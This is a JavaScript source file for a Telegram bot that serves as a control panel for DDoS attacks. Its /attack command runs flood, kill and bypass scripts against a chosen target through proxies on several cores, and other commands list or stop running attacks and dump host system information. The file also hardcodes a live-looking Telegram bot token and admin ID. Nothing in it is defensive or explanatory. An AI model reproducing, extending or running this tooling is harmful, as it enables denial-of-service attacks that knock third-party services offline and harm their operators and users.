const TelegramBot = require('node-telegram-bot-api');
const si = require('systeminformation');
const { exec } = require('child_process');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0';
const adminId = '6601930239';
const bot = new TelegramBot(token, { polling: true });

let attacks = [];

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj' });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

bot.onText(/\/system/, async (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  try {
    const data = await si.getAllData();
    bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2));
  } catch (e) {
    bot.sendMessage(msg.chat.id, 'Error fetching system info');
  }
});

bot.onText(/\/attack\s+(\w+)\s+(\S+)\s+(\d+)(?:\s+--core\s+(\d+))?/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  const method = ['flood', 'kill', 'bypass'].includes(match[1]) ? match[1] : 'flood';
  const target = match[2];
  const time = parseInt(match[3]);
  const core = match[4] ? parseInt(match[4]) : 1;
  const rate = 25;
  const threads = 10;
  const proxyfile = './prx.txt';
  
  if (!target || !time) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time] [--core number]');
    return;
  }
  
  const attackId = Date.now();
  const attackData = {
    id: attackId,
    target,
    time,
    rate,
    threads,
    proxyfile,
    status: 'started',
    messageId: null,
    pids: []
  };
  
  for (let i = 0; i < core; i++) {
    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
      if (err) {
        bot.sendMessage(msg.chat.id, `Attack ${attackId} failed: ${err.message}`);
        attacks = attacks.filter(a => a.id !== attackId);
      }
    });
    attackData.pids.push(child.pid);
  }
  
  attacks.push(attackData);
  
  bot.sendMessage(msg.chat.id, JSON.stringify({
    status: attackData.status,
    target,
    time,
    rate,
    threads,
    proxyfile,
    cores: core
  }, null, 2)).then(sentMsg => {
    attackData.messageId = sentMsg.message_id;
    
    setTimeout(() => {
      attackData.status = 'running';
      let remainingTime = time;
      const interval = setInterval(() => {
        remainingTime -= 5;
        if (remainingTime <= 0) {
          clearInterval(interval);
          bot.deleteMessage(msg.chat.id, attackData.messageId);
          attacks = attacks.filter(a => a.id !== attackId);
          return;
        }
        bot.editMessageText(JSON.stringify({
          status: attackData.status,
          target,
          time: remainingTime,
          rate,
          threads,
          proxyfile,
          cores: core
        }, null, 2), {
          chat_id: msg.chat.id,
          message_id: attackData.messageId
        }).catch(() => {
          clearInterval(interval);
          attacks = attacks.filter(a => a.id !== attackId);
        });
      }, 5000);
    }, 5000);
  });
  
  bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`);
});

bot.onText(/\/list/, (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  if (attacks.length === 0) {
    bot.sendMessage(msg.chat.id, 'No active attacks');
    return;
  }
  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Cores: ${a.pids.length}`).join('\n');
  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`);
});

bot.onText(/\/stop\s+(\d+)/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  const attackId = parseInt(match[1]);
  const attack = attacks.find(a => a.id === attackId);
  if (!attack) {
    bot.sendMessage(msg.chat.id, 'Attack not found');
    return;
  }
  attacks = attacks.filter(a => a.id !== attackId);
  try {
    attack.pids.forEach(pid => process.kill(pid));
    bot.deleteMessage(msg.chat.id, attack.messageId);
    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`);
  } catch (e) {
    bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`);
  }
});
